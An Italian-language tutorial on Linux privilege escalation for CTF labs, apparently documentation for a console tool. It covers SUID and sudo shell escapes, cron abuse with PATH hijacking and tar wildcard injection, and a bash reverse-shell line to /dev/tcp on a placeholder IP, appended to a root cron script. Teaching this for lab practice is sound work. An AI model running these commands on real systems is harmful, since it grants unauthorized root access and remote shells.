# Privilege Escalation — Linux

Come passare da utente normale a root su una target Linux: i primi comandi da lanciare, i vettori più comuni (SUID, cronjob, sudo) e dove trovare i payload pronti.

---

## Primi comandi appena entri

```bash
id                # chi sei, gruppi (sudo? docker? lxd? adm?)
whoami            # utente corrente
sudo -l           # cosa puoi eseguire come root SENZA password
cat /etc/crontab  # cronjob di sistema: cosa gira come root e quando
```

Questi 4 comandi da soli coprono la maggior parte dei privesc nelle CTF.

---

## SUID

Il bit **SUID** consente a un utente di eseguire un file eseguibile con i privilegi del **proprietario** del file, anziché con quelli dell'utente che lo ha avviato. Se il proprietario è root e il binario ha una via di fuga verso una shell → root.

Trova tutti i binari SUID sulla target:

```bash
find / -perm -4000 -type f 2>/dev/null
# oppure (include anche SGID):
find / -perm /6000 -type f 2>/dev/null
```

Confronta l'output con i binari "normali" (`/bin/su`, `/usr/bin/sudo`, `/usr/bin/passwd`…): qualsiasi cosa fuori posto (es. `find`, `vim`, `python`, `tar`, `cp` con SUID) è un vettore.

Esempio classico con `find` SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

> Il flag `-p` serve a preservare i privilegi effettivi: senza, molte shell moderne droppano l'euid root.

---

## Cronjob

I **cronjob** sono script che girano a intervalli regolari, spesso con permessi di root. Se puoi modificare ciò che il cronjob esegue → esegui codice come root.

Dove guardare:

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/* 2>/dev/null
```

Vettori tipici:

1. **Script scrivibile** — il cron lancia `/opt/backup.sh` come root e tu puoi scriverci:
   ```bash
   echo 'bash -i >& /dev/tcp/TUO_IP/4444 0>&1' >> /opt/backup.sh
   # sulla tua macchina: nc -lvnp 4444 → root shell al prossimo giro
   ```
2. **PATH hijacking** — lo script chiama un comando senza path assoluto (es. `tar` invece di `/bin/tar`) e la directory del cron è scrivibile: crei un `tar` malevolo tuo.
3. **Wildcard injection** — il cron usa `tar cf backup.tar *`: crei file chiamati `--checkpoint=1` e `--checkpoint-action=exec=sh shell.sh` nella directory archiviata.

Per capire cosa gira anche se non è in `/etc/crontab`, osserva i processi in tempo reale:

```bash
# se pspy è presente (o caricalo tu con 'serve'):
./pspy64
```

---

## sudo -l: cosa cercare

Se `sudo -l` mostra che puoi eseguire un binario come root (o come altro utente), quel binario è quasi sempre sfruttabile:

```
(ALL) NOPASSWD: /usr/bin/vim        → sudo vim -c ':!/bin/sh'
(ALL) NOPASSWD: /usr/bin/find       → sudo find . -exec /bin/sh \; -quit
(ALL) NOPASSWD: /usr/bin/python3    → sudo python3 -c 'import os; os.system("/bin/sh")'
```

Anche `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` sono privesc immediati.

---

## GTFOBins — i payload pronti

**[GTFOBins](https://gtfobins.org)** è la bibbia: per ogni binario Unix elenca i one-liner per abusarne — shell, reverse shell, SUID, sudo, file read/write, capabilities. È la fonte anche per **script one-liner di revshell** (`bash`, `nc`, `python`, `perl`, `ruby`, `php`…).

In SLConsole è disponibile **offline**: si scarica una copia locale e si interroga dalla console, senza internet (perfetto dentro reti isolate o VPN HTB/THM).

```bash
install gtfobins        # scarica il database GTFOBins in locale (una tantum)
gtfobins find           # tutte le funzioni note per 'find'
gtfobins find suid      # solo il payload SUID
gtfobins bash reverse-shell
gtfobins search vim     # cerca binari per nome
gtfobins list           # tutti i binari nel database locale
gtfobins update         # aggiorna la copia locale
```

Fonte ufficiale: <https://gtfobins.org> — curata da Emilio Pinna e Andrea Cardaci, repo: <https://github.com/GTFOBins/GTFOBins.github.io>

---

## Checklist rapida di enumerazione

```bash
id && whoami
sudo -l
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)' | head  # file scrivibili
ls -la /opt /tmp /var/tmp /dev/shm              # directory interessanti
getcap -r / 2>/dev/null                         # capabilities (es. cap_setuid)
env | grep -i pass; history                     # segreti dimenticati
```

Per l'enumerazione guidata passo-passo usa anche `linseal -i` dalla console: spiega ogni comando mentre lo esegui a mano.
